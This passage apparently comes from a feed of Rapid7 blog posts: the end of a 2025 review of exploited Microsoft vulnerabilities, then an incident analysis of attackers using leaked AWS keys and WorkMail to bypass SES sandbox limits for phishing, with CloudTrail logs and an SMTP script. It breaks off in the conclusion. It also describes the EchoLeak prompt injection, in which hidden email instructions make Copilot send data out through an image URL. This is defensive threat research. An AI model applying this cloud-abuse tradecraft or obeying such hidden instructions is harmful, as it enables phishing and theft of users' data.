infrastructure.</p><p>So far, January 2025 is the only time that Microsoft has ever published vulnerabilities in the Hyper-V VSP. Generally speaking, a significant degree of sophistication is required to develop successful exploits of this nature. This goes double if the name of the game is stealth and stability, since a wave of unexplained <a href=\"https://support.microsoft.com/en-us/windows/troubleshooting-windows-unexpected-restarts-and-stop-code-errors-60b01860-58f2-be66-7516-5c45a66ae3c6\">BSOD events</a> on critical production infrastructure tends to attract blue team attention. Still, once a viable proof of concept hits the public internet, ransomware crews will fold it into their toolkits, and someone, somewhere, is either sitting on an unknown Hyper-V VSP exploit, or hard at work creating the next one.</p>February: Socket to me<p>It’s hard to imagine a modern computer without storage or networking capabilities. In fact, it’s hard to imagine a computer from several decades ago without storage or networking. Microsoft is now middle-aged, and that means that buried deep within your shiny new PC are a variety of architectural decisions and logic paths born in the 1980s. If this sounds far-fetched, take a minute to find yourself a fully-patched Windows 11 25H2 machine, and then <a href=\"https://devblogs.microsoft.com/oldnewthing/20031022-00/?p=42073\">try to rename any file or directory CON, NUL or PRN</a>. I’ll wait.</p><p>Generally speaking, user-mode applications are prevented from wreaking havoc on the kernel through a careful separation of concerns. On Windows, when a user mode application wants to communicate over the network, it talks to WinSock, which in turn talks to the ancillary function driver (AFD), which sits on the kernel side, and coordinates with the kernel network drivers which handle the actual traffic. The AFD is a security boundary between user space and kernel space, and it must be universally accessible to local processes, because even a browser tab in a sandbox needs to make network calls. Any defect in the way AFD parses input from user space can thus provide a way to influence the kernel in unexpected ways. A number of advanced exploit development courses, including offerings from SANS and OffSec, cover AFD in detail.</p><p>⠀</p>Chart 2: Windows AFD vulnerabilities timeline, 2021-2025<p>⠀</p><p>Patch Tuesday February 2025 brought us <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-21418\">CVE-2025-21418</a>, which Microsoft credited to Anonymous. We don’t know whether the unnamed tipster provided evidence of exploitation in the wild, or whether Microsoft threat hunters subsequently tracked down their own trail of suspicious bread crumbs, but notorious threat actors such as North Korea’s Lazarus are known to be enthusiastic students of AFD exploits. With several high-profile zero-day vulnerabilities emerging from AFD from late 2024 onwards, it tracks that Microsoft subsequently published and patched a cluster of AFD vulnerabilities in the latter half of 2025.</p>March: File system shenanigans<p>Any defenders who had enjoyed a quieter start to the year were rudely awakened by <a href=\"https://www.rapid7.com/blog/post/2025/03/11/patch-tuesday-march-2025/\">Patch Tuesday March 2025</a>, when six exploited-in-the-wild vulnerabilities all dropped at once. Exploitation of most of the zero-day vulnerabilities published in March starts with the user mounting a malicious Virtual Hard Disk (VHD) image or plugging in a malicious USB stick so that the attacker can exploit a weakness in a filesystem driver, including NTFS and FastFAT.</p><p>Remember that information security training which asked you to imagine finding a USB stick with an “IMPORTANT (CONFIDENTIAL)” label on the floor outside the office? The one which asked if you would A) plug the mystery stick into your work PC B) use your boss’ personal laptop in case the files are business critical C) try it in all the PCs in the office until someone asks you to stop or D) report it immediately to the security officer? This is why.</p><p>Meanwhile, the true villain of the month was almost certainly <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-24983\">CVE-2025-24983</a>, a no-user-interaction-required elevation of privilege vulnerability in the Win32 kernel subsystem. At the time, we pondered why Windows 11 and Server 2019 onwards didn’t receive patches for what looks like a fairly severe vulnerability, but since Microsoft is gradually reimplementing portions of the kernel in memory-safe Rust, we can hope that the vulnerability simply doesn’t exist in modern Windows.</p>April: Common Log File System driver vulns are quite common<p>If anyone ever corners you at a party and talks at length about the Ancillary Function Driver as a bounteous source of elevation of privilege vulnerabilities, you will probably have to concede that they are technically correct. While your options include “doing a lap” and then climbing out of the bathroom window, the power move here is to hold your ground, and point to the Common Log File System driver as a far richer vein of exploitable goodness.</p><p>As of <a href=\"https://www.rapid7.com/blog/post/2025/04/08/patch-tuesday-april-2025/\">Patch Tuesday April 2025</a>, CLFS boasts almost twice the number of total vulnerabilities over the past five years vs. AFD, and more than double the number of known-exploited zero-day vulnerabilities. It really is the gift which keeps on giving.</p><p>⠀</p>Windows CLFS vulnerabilities timeline, 2021-2025<p>⠀</p><p>It makes sense that something like the Ancillary Function Driver lives in kernel space. After all, something has to sit inside the perimeter to marshall all those network requests from dozens of Chrome tabs. What about the Common Log File System driver though?</p><p>It would be tempting to imagine that anything which simply handles log files shouldn’t need direct kernel access at all. When exploring this concept, it’s useful to understand that not only was CLFS designed a long time ago, when high performance in user mode was harder to achieve than it is today, but also that CLFS is much more than simply a means to interact with log files. CLFS is the home of still-essential building blocks like Transactional NTFS (TxF), first introduced almost 25 years ago in Windows Vista, which provides a means for applications to guarantee the integrity of data on disk.</p><p>For the past several years, Microsoft has <a href=\"https://learn.microsoft.com/en-us/windows/win32/fileio/transactional-ntfs-portal\">strongly recommended</a> that developers avoid the use of TxF, and while Microsoft is gradually providing modern alternatives to TxF functionality, essential Windows functions such as Windows Update still rely on it to manage critical file integrity. Moreover, CLFS is more than just TxF, and is so tightly integrated into Windows that it’s here to stay for the foreseeable future.</p>May: The month of expectation, wishes, hope, and classic Windows zero-days [1]<p>A few days after <a href=\"https://www.rapid7.com/blog/post/2025/05/13/patch-tuesday-may-2025/\">Patch Tuesday May 2025</a>, Satya Nadella took to the stage at Microsoft Build 2025 to pitch his vision of the open agentic web, although exactly who this version of the future would be open to remains an open question, like: What if a cloud email service was vulnerable to a zero-click prompt injection attack, but could also now buy things with your credit card?</p><p>While critical reception for the open agentic web has been mixed, threat actors will be glad of the new attack surface. Meanwhile, defenders worried about in-the-wild exploitation were hard at work patching some more frequent fliers, including another pair of CLFS vulnerabilities and an MSHTML/Trident arbitrary code execution bug. That last one will be familiar to regular Patch Tuesday watchers, but it might come as a surprise to anyone who thought Internet Explorer had gone to live on a nice farm upstate years ago.</p><p>The Ancillary Function Driver made another appearance, although it couldn’t quite summon the same main character energy this time around. The <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-32709\">May 2025 episode</a> of “AFD vulns exploited in the wild” offered elevation to Administrator, rather than SYSTEM, and a lower exploit code maturity rating. We can always be grateful for small mercies.</p><p><em>[1]: With apologies to Emily Brontë.</em></p>June: I’m afraid I can’t let you do that, WebDAV<p>Windows archeologists and internet users of a certain age may remember WebDAV, a <a href=\"https://datatracker.ietf.org/doc/html/rfc2291\">standard</a> originally dreamed up to support interactivity on the web. It was employed by versions of Microsoft Exchange up to and including 2010 to handle interactions with mailboxes and public folders.</p><p>Surprising no-one, Windows still <a href=\"https://learn.microsoft.com/en-us/windows/whats-new/deprecated-features\">more or less</a> supports WebDAV, and it was only a matter of time before that turned out to be a bit of a problem, in the form of <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-33053\">CVE-2025-33053</a> published as part of <a href=\"https://www.rapid7.com/blog/post/2025/06/10/patch-tuesday-june-2025/\">Patch Tuesday June 2025</a>. Microsoft acknowledged Check Point Research (CPR) on the advisory; CPR in turn attributes exploitation to an APT (Advanced Persistent Threat), which they track as the objectively cool-sounding <a href=\"https://attack.mitre.org/groups/G0038/\">Stealth Falcon</a>, an established threat actor with a long-running interest in governments and government-adjacent entities across the Middle East and beyond.</p><p>June 2025 also saw the publication of <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-32711\">CVE-2025-32711</a>, a critical information disclosure vulnerability in Microsoft 365 Copilot. Microsoft is not aware of exploitation in the wild. The researchers named it EchoLeak, <a href=\"https://www.arxiv.org/pdf/2509.10540\">describing</a> it as “the first real-world zero-click prompt injection exploit in a production LLM system,” although <a href=\"https://arxiv.org/pdf/2302.12173\">other researchers arguably got there first</a>.</p><p>EchoLeak relies on hidden white-text-on-white-background instructions in an email, which are then ingested into the LLM via RAG (Retrieval-Augmented Generation) when the user asks an entirely pedestrian question (e.g. “Summarize my emails from the past two days”) which requires Copilot to scan the inbox. The malicious instructions have two parts: First, dig up some juicy info, and then retrieve an image from an attacker-controlled server with the sensitive data exfiltrated as a URL parameter.</p><p>EchoLeak circumvented Copilot’s Content Security Policy by making the request via a trusted Microsoft service: a now-patched Teams image preview proxy. History suggests that attackers will find other ways out of the walled garden. The Microsoft advisory makes a virtue of minimalism by providing almost no information about the nature of the vulnerability, although Microsoft is surely to be commended for <a href=\"https://www.microsoft.com/en-us/msrc/blog/2024/06/toward-greater-transparency-unveiling-cloud-service-cves\">assigning CVEs for cloud service vulnerabilities</a>.</p>July: The call is coming from inside the intranet<p>When <a href=\"https://www.rapid7.com/blog/post/patch-tuesday-july-2025/\">Patch Tuesday July 2025</a> came and went without a single exploited-in-the-wild vulnerability published, many people may have breathed a sigh of relief. Possibly this was a valid move, at least for anyone not responsible for a SharePoint instance.</p><p>SharePoint defenders will remember July as <a href=\"https://www.rapid7.com/research/report/cve-2025-53770/\">the month of ToolShell</a>, an actively-exploited vulnerability chain in SharePoint which Microsoft published out of band ten days after Patch Tuesday. Out of band patches for Microsoft flagship products are rare, since they inevitably cause downstream disruption. Once <a href=\"https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/\">MSTIC publicly attributes exploitation to two Chinese nation-state actors</a>, that line has been crossed.</p><p>The vulnerability described by the out-of-band <a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53770\">CVE-2025-53770</a> turned out to be a bypass for the patch introduced by <a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49704\">CVE-2025-49704</a> earlier in the month, which was itself a response to a successful Pwn2Own Berlin entry from May.</p>August: It’s almost too quiet<p>Microsoft was not aware of exploitation in the wild for any of the vulnerabilities published as part of <a href=\"https://www.rapid7.com/blog/post/patch-tuesday-august-2025/\">Patch Tuesday August 2025</a>. SharePoint admins may have been dealing with the fallout from last month’s ToolShell and bracing for a possible repeat, but August might otherwise have made for an eerily quiet month. Still, the Windows implementation of Kerberos managed to cough up a <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-53779\">publicly-disclosed elevate-to-domain-admin vulnerability</a>.</p><p>Separately, we learned that simply <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-50165\">saving a JPEG</a> could be enough to hand an attacker RCE capabilities, because the internet never sleeps. If the vulnerable codepath had been within JPEG decoding, rather than encoding, this one could have been the biggest vuln of the year.</p>September: Almost too quiet, part 2<p><a href=\"https://www.rapid7.com/blog/post/em-patch-tuesday-september-2025/\">Patch Tuesday September 2025</a> was the second month in a row with no known-exploited vulnerabilities, but vuln spotters will appreciate that this month saw the publication of a fairly rare beast: a Microsoft vulnerability with a perfect(?) CVSS v3 base score of 10.0, albeit a cloud service vulnerability discovered by Microsoft and patched prior to publication. No customer action required, but also no customer verification possible, and since <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-54914\">the impacted cloud service was Azure Networking</a>, the blast radius could have been stupendous.</p>October: Dial M for exploitation<p>These days, there are plenty of seasoned IT professionals who don’t even know what a dialup modem negotiation song sounds like, simply because broadband has been around for that long. For younger readers, “broadband” is what we used to call “internet fast enough that you don’t have to wait to download a single email attachment”.</p><p>By this point, we all know where this is going: Windows still ships with modem capabilities well beyond their sell-by date, and someone found a good old <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-24990\">elevation of privilege vulnerability</a>. The vulnerable fax modem driver was developed almost 30 years ago by a long-defunct third party, and Microsoft has now taken uncharacteristically bold action by removing it from Windows altogether, perhaps recognizing that traditional landlines are no longer available at all in many places. Are there other fax modem drivers still lurking in Windows? <a href=\"https://www.rapid7.com/blog/post/em-patch-tuesday-january-2026/\">You betcha</a>.</p><p><a href=\"https://www.rapid7.com/blog/post/em-patch-tuesday-october-2025/\">Patch Tuesday October 2025</a> also marked the end of Windows 10, unless you count the cash-for-patches <a href=\"https://learn.microsoft.com/en-us/windows/whats-new/extended-security-updates\">Extended Security Updates (ESU) program</a>.</p>November: Kernel vuln? Popcorn time<p><a href=\"https://www.rapid7.com/blog/post/em-patch-tuesday-november-2025/\">Patch Tuesday November 2025</a> included an exploited-in-the-wild vulnerability in the Windows kernel itself. While the advisory was light with details, exploitation of <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-62215\">CVE-2025-62215</a> led to elevation to SYSTEM, presumably via a complex bit of memory management three card monte. Those kernel Rust rewrites can’t come soon enough.</p>December: A cloud of suspicion<p>After a year filled with variations of the same old exploitable vulns, it might almost be refreshing to consider the altogether more modern-sounding exploited-in-the-wild vulnerability published on <a href=\"https://www.rapid7.com/blog/post/em-patch-tuesday-december-2025/\">Patch Tuesday December 2025</a>. <a href=\"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-62221\">CVE-2025-62221</a> describes an elevation of privilege vulnerability in the Windows Cloud Files Mini Filter Driver.</p><p>On Windows, a file or directory can contain a <a href=\"https://learn.microsoft.com/en-us/windows/win32/fileio/reparse-points\">reparse point</a>, a collection of user-controlled metadata designed to be interpreted by a file filter driver. An example would be a file which appears present in a local folder, but where the actual contents of the file are stored remotely on OneDrive. The user double-clicks on the file, the file filter driver intercepts the request, reads the metadata, and calls out to OneDrive, while the user gets the experience of opening the file as though it had been stored locally. Of course, the file filter driver needs kernel access to perform its duties. Find an exploitable flaw in the way a file filter driver parses the metadata, and you can trick it into doing things like overwriting protected system files.</p>What’s next?Everything gets faster, including bad things<p>As Rapid7 has observed repeatedly, time to known exploitation for widely-exploited vulnerabilities has been shrinking year-on-year. By 2022, the <a href=\"https://www.rapid7.com/about/press-releases/rapid7-vulnerability-intelligence-report-shows-attackers-developing-and-deploying-exploits-faster-than-ever/\">time to exploitation after public disclosure for some of the most notable security vulnerabilities</a> was as low as 24 hours. With exploit development now widely augmented by automation and AI, there is every reason to suppose that the window will continue to shrink further.</p>Threat actors will stay best friends with elevation of privilege vulns<p>A wormable unauthenticated RCE vulnerability remains the scariest scenario, but mercifully these are historically rare. The one-two combo of minimally-privileged initial access and local privilege escalation presents a much more clear and present danger in most modern threat models. Sure, you could parachute in from a helicopter, abseil down from the roof, and crawl through an air vent to steal the diamond, but why bother when you could simply tailgate a delivery driver, and then distract a maintenance worker while you swipe their all-access keycard?</p>AI is here to stay, but tech debt is the real killer<p>In 2026, Microsoft will regularly publish AI-related vulnerabilities, and AI-wielding threat actors will hammer Microsoft’s cloud services. Blue teams managing significant Windows estates will still spend more time worrying about on-prem vulnerabilities where the root cause is a classic software engineering snafu.</p>Final thoughts<p>Arguably the biggest takeaway from 2025 is that the more things change, the more they stay the same. The scariest Microsoft vulnerabilities tend to emerge from the same few familiar places: core Windows components with codebases older than many of the humans who rely on them.</p><p>Microsoft’s wildly successful business model is founded on a decades-long insistence on ironclad backwards compatibility. Why? Enterprise customers with deep pockets and deeper catalogues of ancient business applications. These retro capabilities come at a high price: a supervolcano of tech debt potentially unmatched in all of human history, and a seemingly endless supply of sort-of-new but depressingly familiar vulnerabilities.</p><p>For anyone responsible for defending a significant Microsoft footprint in 2026, tomorrow’s biggest problem remains today’s secrets exposed by yesterday’s software design choices.</p>",

    "link": "https://www.rapid7.com/blog/post/dr-threat-actors-aws-workmail-phishing-campaigns",
    "summary": "Introduction<p>At Rapid7, we track a wide range of threats targeting cloud environments, where a frequent objective is hijacking victim infrastructure to host phishing or spam campaigns. Beyond the obvious security risks, this approach allows threat actors to offload their operational costs onto the target company, often resulting in significant, unwanted bills for services the victim never intended to use.</p><p>Rapid7 recently investigated a cloud abuse incident in which threat actors leveraged compromised AWS credentials to deploy phishing and spam infrastructure using AWS WorkMail, bypassing the anti-abuse controls normally enforced by AWS Simple Email Service (SES). AWS SES is a general-purpose, API-driven email platform intended for application-generated email such as transactional notifications and marketing messages. This allows the threat actor to leverage Amazon’s high sender reputation to masquerade as a valid business entity, with the ability to send email directly from victim-owned AWS infrastructure. Generating minimal service-attributed telemetry also makes threat actor activity difficult to distinguish from routine activity. Any organization with exposed AWS credentials and permissive Identity and Access Management (IAM) policies are potentially at risk, particularly those without guardrails or monitoring around WorkMail and SES configuration.</p><p>In this post, we analyzed a real-world incident observed by our MDR team in which threat actors abused native AWS email services to build phishing and spam infrastructure inside a compromised cloud environment. We will reconstruct the attacker’s progression from credential validation and IAM reconnaissance to bypassing Amazon SES safeguards by pivoting to AWS WorkMail. Along the way, we highlight how legitimate service abstractions can be leveraged to evade detection, examine the resulting logging and attribution gaps, and outline practical detection and prevention strategies defenders can use to identify and disrupt similar cloud-native abuse.</p>Background: AWS WorkMail and its key components<p>AWS WorkMail is a fully managed business email and calendaring service that allows organizations to operate corporate mailboxes without deploying or maintaining their own mail servers. It supports standard email protocols such as IMAP and SMTP, as well as common desktop and mobile clients, making it a lightweight, pay-as-you-go alternative for teams already operating within AWS.</p><p>To understand the activities performed by threat actors in the incident, it’s important to first introduce several core concepts within AWS WorkMail.</p>Organization<p>An Organization is the top-level container in WorkMail. It represents an isolated email environment that holds all users, groups, and domains. Each WorkMail organization is region-specific and operates independently, which allows attackers to create disposable, self-contained email infrastructures with minimal setup.</p>Users<p>Users represent individual mail-enabled identities within a WorkMail organization. After a user is created using the “<em>workmail:CreateUser”</em> API call, a mailbox can be assigned via a “<em>workmail:RegisterToWorkMail</em>”API call. Once registered, the user can authenticate to the AWS WorkMail web client or connect via standard email protocols and immediately begin sending and receiving email.</p>Groups<p>Groups are collections of users that can receive email on behalf of multiple members. They are typically used for distribution lists or shared inboxes and can simplify bulk message delivery or internal coordination within a WorkMail organization.</p>Domains<p>Domains define the email address namespace used by a WorkMail organization (e.g.@example.com). Before a domain can be used, ownership must be verified. This verification process leverages the standard domain verification mechanism of Amazon Simple Email Service, typically via DNS records. Once verified, the domain can be actively used for sending and receiving email, enabling threat actors to operate from attacker-controlled, but seemingly legitimate, domains.</p>Attack analysis<p>The diagram below contains a graphical representation of the key events carried out by the attackers throughout the attack, starting with initial access actions, continuing through privilege escalation, and ending with the achievement of objectives.</p>Figure 1: Graphical visualization of the attack<p></p>Initial access<p>The compromise began with the exposure of long-term AWS access keys. The first indication of malicious activity was an <em>“sts:GetCallerIdentity”</em> API call with the User-Agent set to <strong>“</strong>TruffleHog Firefox.<strong>”</strong> This strongly suggests the use of TruffleHog, a tool commonly leveraged by adversaries to discover and validate leaked credentials from sources such as GitHub, GitLab, and public S3 buckets. Rapid7 has frequently observed TruffleHog usage in active campaigns, including activity attributed to groups such as the <a href=\"https://www.rapid7.com/blog/post/tr-crimson-collective-a-new-threat-group-observed-operating-in-the-cloud/\" target=\"_blank\">Crimson Collective</a>.</p><p>Several days after this initial credential validation, we observed suspicious activity involving a second IAM user authenticated via long-term access keys. While we cannot conclusively prove that both users were accessed by the same operator, multiple factors suggest they were part of the same intrusion activity. Notably, both authentications originated from the same geographic region, which was anomalous for the victim’s normal operating patterns. Throughout the incident window, access to both accounts was conducted through a rotating set of IP addresses associated primarily with cloud service providers such as Amazon and DigitalOcean. This infrastructure choice is consistent with common adversary tradecraft used to obfuscate true origin and blend into legitimate cloud-to-cloud traffic.</p><p>⠀</p>Figure 2: Example TruffleHog output showing discovered credentials for Google Cloud Platform (GCP)Discovery phase and privilege escalation<p>Following initial access, the first compromised user was used to perform basic environment discovery via native AWS APIs. These attempts repeatedly resulted in AccessDenied errors, indicating that the exposed credentials were constrained by limited permissions. The activity was conducted using the AWS command-line interface (CLI), suggesting hands-on, interactive exploration by the threat actor rather than automated tooling.</p><p>After encountering these limitations, the adversary shifted activity to the second set of compromised credentials, which possessed significantly broader permissions. With this user, enumeration became more deliberate and structured. The actor began with <em>iam:ListUsers</em> API calls to understand the identity landscape and then used a technique of intentionally triggering API errors to confirm specific permissions without making persistent changes.</p><p>As part of this broader discovery effort, the actor also queried Amazon SES to assess its current configuration and readiness for abuse. Specifically, they executed <em>ses:GetAccount</em><em> </em>and <em>ses:ListIdentities</em>. These calls allowed the adversary to quickly map the operational status of SES within the account. The <em>ses:ListIdentities</em> API call was used to determine whether any verified identities (domains or email addresses) already existed that could be immediately leveraged for sending mail; none were present at the time. In parallel, <em>ses:GetAccount</em><em> </em>was used to identify whether the account was operating in the SES sandbox, which would impose strict sending limits and require additional steps before large-scale email campaigns could be launched.</p><p>This SES-focused reconnaissance indicates early intent to abuse email-sending capabilities and demonstrates how attackers can efficiently evaluate service readiness using only a small number of low-noise management API calls.</p><p>For example, the actor attempted to create an IAM user that already existed. The resulting error response confirmed possession of <em>iam:CreateUser</em><em> </em>permissions without successfully creating a new entity:</p><p>⠀</p><pre>{\n\"userAgent\": \"aws-cli/1.22.34 Python/3.10.12 Linux/5.15.0-113-generic botocore/1.23.34\",\n\"errorCode\": \"EntityAlreadyExistsException\",\n\"errorMessage\": \"User with name xxxx already exists.\"\n}</pre><p><em>Listing 1: Part of the </em><em>iam:CreateUser</em><em> CloudTrail log</em></p><p>⠀</p><p>A similar validation was performed using <em>iam:CreateLoginProfile</em><em>.</em> By supplying a password that violated the account’s password policy, the actor received a <em>PasswordPolicyViolationException</em>, confirming their ability to create console login profiles:</p><p>⠀</p><pre>{\n\"userAgent\": \"aws-cli/1.22.34 Python/3.10.12 Linux/5.15.0-113-generic botocore/1.23.34\",\n\"errorCode\": \"PasswordPolicyViolationException\",\n\"errorMessage\": \"Password should have at least one uppercase letter\"\n}</pre><p><em>Listing 2: Part of the </em><em>iam:CreateLoginProfile</em><em> CloudTrail log</em></p><p>⠀</p><p>After validating the scope of their privileges, the adversary created a new IAM user, attached the AWS managed policy “<em>AdministratorAccess”</em>, and established a login profile to enable AWS Management Console access. This marked a transition from CLI-based reconnaissance to full GUI-based control, providing unrestricted access and setting the stage for subsequent operational activity.</p>Action on objectives: Preparing email infrastructure for abuse<p>By the end of the discovery phase, the threat actor had established two critical facts:</p><ol><li><p>No verified identities existed in Amazon Simple Email Service (SES).</p></li><li><p>The account remained restricted by the SES sandbox.</p></li></ol><p>The SES sandbox is explicitly designed to limit fraud and abuse, and its restrictions effectively prevent meaningful phishing or spam campaigns. While an account remains in the sandbox, the following controls apply:</p><ul><li><p>Emails can only be sent to verified identities (email addresses or domains) or the SES mailbox simulator.</p></li><li><p>A maximum of <strong>200 messages per 24-hour period</strong>.</p></li><li><p>A maximum sending rate of <strong>1 message per second</strong>.</p></li></ul><p>These constraints made SES unsuitable for immediate abuse at scale. Rather than abandoning the service, the attacker initiated a process to legitimize higher-volume email sending.</p><p>First, they opened a support case with AWS requesting removal from the SES sandbox. In parallel, they requested a substantial increase to the daily sending quota— setting it to <strong>100,000 emails per day</strong> —using the <em>servicequotas:RequestServiceQuotaIncrease</em><em> </em>API call.</p><p>⠀</p><pre>{\n    \"requestParameters\": {\n\"serviceCode\": \"ses\",\n\"quotaCode\": \"L-XXXXXX\",\n\"desiredValue\": 100000\n\t\n}</pre><p><em>Listing 3: Request parameters from </em><em>RequestServiceQuotaIncrease</em><em> API call</em></p><p>⠀</p><p>During this waiting period, the actor focused on persistence and stealth. Multiple IAM users were created.. These usernames were deliberately chosen to resemble region- or service-scoped automation accounts rather than human operators. To further reduce suspicion during IAM audits, the attacker attached narrowly scoped, SES-only policies to these users instead of broad administrative permissions. This approach allowed them to preserve operational access while minimizing obvious indicators of compromise such as over-privileged identities.</p><p>At this stage, the attacker had effectively prepared the account for large-scale email abuse-but they did not wait for AWS approval to proceed.</p>Bypassing SES controls by abusing AWS WorkMail<p>Rather than remaining idle while SES sandbox removal and quota increases were pending, the attacker pivoted to AWS WorkMail, which offers an alternative email-sending pathway with significantly fewer upfront restrictions.</p><p>Using the <em>workmail:CreateOrganization</em><em> </em>API, the threat actor created multiple WorkMail organizations. They then initiated domain verification workflows for domains designed to appear legitimate and business-like, including:</p><ul><li><p>cloth-prelove[.]me</p></li><li><p>ipad-service-london[.]com</p></li></ul><p>Domain verification was performed through <em>ses:VerifyDomainIdentity</em> and <em>ses:VerifyDomainDkim</em>, with the calls originating from <em>workmail.amazonaws.com</em>. This highlights an important nuance for defenders: although SES APIs are involved, the activity is driven by WorkMail provisioning rather than traditional SES email campaigns.</p><p>Once domain verification was completed, the actor created multiple mailbox users directly within WorkMail, such as:</p><ul><li><p>service@ipad-service-london[.]com</p></li><li><p>marketing@ipad-service-london[.]com</p></li></ul><p>These accounts served two purposes. First, they established persistence at the application layer, independent of IAM. Second, they provided credible sender identities for phishing and spam operations, closely resembling legitimate corporate email addresses.</p><p>There were also AWS directory service events logged by CloudTrail that show new aliases created for the new sender domains, using the victim’s directory tenant:</p><p><em><strong>CreateAlias</strong></em></p><p><em><strong>AuthorizeAppication</strong></em></p><p>This pivot is particularly impactful because <strong>AWS WorkMail does not implement a sandbox model</strong> comparable to SES. Emails can be sent immediately to external, unverified recipients. Additionally, WorkMail supports significantly higher sending volumes than SES sandbox limits. While Rapid7 has not empirically validated the maximum throughput, AWS documentation cites a default upper limit of <strong>100,000 external recipients per day per organization</strong>, aggregated across all users.</p>Email sending methods and logging gaps<p>The attacker had two viable options for sending email through WorkMail:</p><p><strong>1. Web interface</strong><br>Emails sent through the AWS WorkMail web client may surface indirectly in CloudTrail as “<em>ses:SendRawEmail”</em> events. These events are generated because WorkMail uses Amazon Simple Email Service (SES) as its underlying mail transport, even though the messages are composed and sent entirely through the WorkMail application.</p><p>While these events are not attributed to an IAM principal, they do expose several pieces of valuable metadata within the “<em>requestParameters”</em> field — most notably the sender’s email address and associated SES identity. This allows defenders to link outbound email activity to specific WorkMail users and recently verified domains, even in the absence of traditional application or message-level logs.</p><p>One notable limitation of these “<em>ses:SendRawEmail”</em> events is the absence of a true client source IP address. Because emails sent via the WorkMail web interface are executed by an AWS-managed service on behalf of the mailbox user, CloudTrail records the “<em>sourceIPAddress”</em> as “<em>workmail.&lt;region&gt;.amazonaws.com”</em> rather than the originating IP address of the actor’s browser session. This effectively obscures the attacker’s true network origin and prevents defenders from correlating email-sending activity with suspicious IP ranges, TOR exit nodes, or previously observed intrusion infrastructure.</p><p>⠀</p><pre>{\n\"eventVersion\": \"1.11\",\n\"userIdentity\": {\n\"type\": \"AWSService\",\n\"invokedBy\": \"workmail.us-east-1.amazonaws.com\"\n    },\n\"eventTime\": \"2025-12-20T11:26:59Z\",\n\"eventSource\": \"ses.amazonaws.com\",\n\"eventName\": \"SendRawEmail\",\n\"awsRegion\": \"us-east-1\",\n\"sourceIPAddress\": \"workmail.us-east-1.amazonaws.com\",\n\"userAgent\": \"workmail.us-east-1.amazonaws.com\",\n\"requestParameters\": {\n\"sourceArn\": \"arn:aws:ses:us-east-1:123456789012:identity/malicious-organiation[.]com\",\n\"destinations\": [\n\"HIDDEN_DUE_TO_SECURITY_REASONS\"\n        ],\n\"source\": \"=?UTF-8?Q?Malicious_User?= &lt;marketing@malicious-organiation[.]com&gt;\",\n\"fromArn\": \"arn:aws:ses:us-east-1:123456789012:identity/malicious-organiation[.]com\",\n\"configurationSetName\": \"gcp-iad-prod-workmail-default-configuration-set\",\n\"rawMessage\": {\n\"data\": \"HIDDEN_DUE_TO_SECURITY_REASONS\"\n        }\n    },\n\"responseElements\": null,\n\"additionalEventData\": {\n\"SignatureVersion\": \"4\",\n\"sesMessageId\": \"0100019b3c4a8bb7-50af951c-fbd4-4610-bc94-c7fc35733699-000000\"\n    },\n\"requestID\": \"aff61405-04bd-4969-802a-7ce4d5946949\",\n\"eventID\": \"c34ed12d-5bec-3fdd-aef9-57ae4313ca88\",\n\"readOnly\": true,\n\"resources\": [\n        {\n\"accountId\": \"123456789012\",\n\"type\": \"AWS::SES::ConfigurationSet\",\n\"ARN\": \"arn:aws:ses:us-east-1:123456789012:configuration-set/gcp-iad-prod-workmail-default-configuration-set\"\n        },\n        {\n\"accountId\": \"123456789012\",\n\"type\": \"AWS::SES::EmailIdentity\",\n\"ARN\": \"arn:aws:ses:us-east-1:123456789012:identity/malicious-organiation[.]com\"\n        }\n    ],\n\"eventType\": \"AwsApiCall\",\n\"managementEvent\": false,\n\"recipientAccountId\": \"123456789012\",\n\"sharedEventID\": \"xxx\",\n\"eventCategory\": \"xxx\"}</pre><p><em>Listing 4: </em><em>SendRawEmail</em><em> event logged after an email is sent via AWS WorkMail web interface</em><em>⠀</em></p><p>⠀</p><p>While limited, this telemetry can still be valuable for correlating suspicious sending behavior with recently created WorkMail users or newly verified domains.</p><p><strong>2. SMTP access</strong><br>Alternatively, the attacker can authenticate directly to WorkMail’s SMTP endpoint and send messages programmatically. Emails sent via SMTP<strong> </strong>do not generate CloudTrail events, even when SES data events are enabled, creating a significant blind spot for defenders.</p><p>An example Python script used to send email through WorkMail SMTP is shown below:</p><p>⠀</p><pre>import smtplib\nfrom email.message import EmailMessage\n\n# Configuration\nSMTP_SERVER = \"smtp.mail.us-east-1.awsapps.com\"\nSMTP_PORT = 465\nEMAIL_ADDRESS = \"email@example.com\"\nEMAIL_PASSWORD = \"****\"\n\n# Create the message\nmsg = EmailMessage()\nmsg[\"Subject\"] = \"WorkMail SMTP\"\nmsg[\"From\"] = EMAIL_ADDRESS\nmsg[\"To\"] = \"&lt;unverified_email&gt;\"\nmsg.set_content(\"Email Delivered to an Unverified Email via AWS WorkMail\")\n\n# Send the email\ntry:\nwith smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as smtp:\nsmtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)\nsmtp.send_message(msg)\nprint(\"Email sent successfully!\")\nexcept Exception as e:\nprint(f\"Error: {e}\")</pre><p><em>Listing 5: Example script sending messages via AWS WorkMail via SMTP</em></p><p>⠀</p><p>From an attacker’s perspective, this method is ideal: higher volume, immediate external reach, and minimal centralized logging. From a defender’s perspective, it underscores the importance of monitoring WorkMail organization creation, domain verification events, and mailbox provisioning, as these actions often precede phishing activity that will never be visible in CloudTrail.</p>Conclusion<p>This incident illustrates how threat actors can abuse higher-level AWS services to deploy phishing and spam infrastructure closely resembling legitimate enterprise usage. While AWS WorkMail is not designed to support bulk email 